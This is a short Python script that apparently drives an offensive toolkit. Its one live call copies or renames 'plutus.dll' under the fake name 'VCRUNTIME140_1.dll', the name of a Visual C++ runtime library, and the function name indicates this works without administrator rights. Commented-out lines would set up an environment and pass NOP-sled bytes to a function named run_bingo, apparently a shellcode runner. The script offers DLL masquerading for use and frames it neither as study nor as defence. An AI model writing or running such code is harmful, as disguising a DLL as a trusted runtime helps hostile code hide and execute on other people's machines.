from src.core import run_bingo, setup_environment, mv_dll_plutus_noadmin

mv_dll_plutus_noadmin("plutus.dll", fake_name="VCRUNTIME140_1.dll")

# setup_environment()

# bingo.core.setup_environment()
# run_bingo(b"\x90\x90\x90\x90")